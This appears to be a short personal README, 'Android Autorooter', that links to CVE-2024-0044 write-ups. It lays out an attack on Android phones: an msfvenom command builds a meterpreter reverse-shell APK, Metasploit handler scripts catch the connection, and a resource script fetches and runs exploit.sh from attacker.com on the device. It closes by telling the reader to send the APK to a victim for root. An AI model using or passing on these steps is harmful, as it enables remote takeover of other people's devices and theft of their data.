

# Android Autorooter
[![Autorooter](https://cdn.mos.cms.futurecdn.net/k7c2VW8eHbWtSaCgzLAa4P-320-80.jpeg)]
This is just a mental note more than anything to further explore the posibilities of the work done here:
https://rtx.meta.security/exploitation/2024/03/04/Android-run-as-forgery.html
https://tinyhack.com/2024/06/07/extracting-whatsapp-database-or-any-app-data-from-android-12-13-using-cve-2024-0044/?s=03
https://www.mobile-hacker.com/2024/06/17/exfiltrate-sensitive-user-data-from-apps-on-android-12-and-13-using-cve-2024-0044-vulnerability/

Ultimately I'd like to have a self executing exploit but babysteps yeah..

## Give this a try

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> R > payload.apk
```

Create a resource script execute_script.rc to automate the commands:
```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <attacker_port>
exploit -j
set AutoRunScript multi_console_command -rc /path/to/commands.rc
```

Create the resource script with the necessary commands:
```
cd /data/local/tmp
wget http://attacker.com/exploit.sh -O exploit.sh
chmod +x exploit.sh
./exploit.sh
```

Start Metasploit with the resource script:
```
msfconsole -r execute_script.rc
```
Get the party started with:
```
msfconsole -r execute_script.rc
```

Now your listener/payload delivery is set up...  Send that payload.apk to the victim.. Lets get some root baby
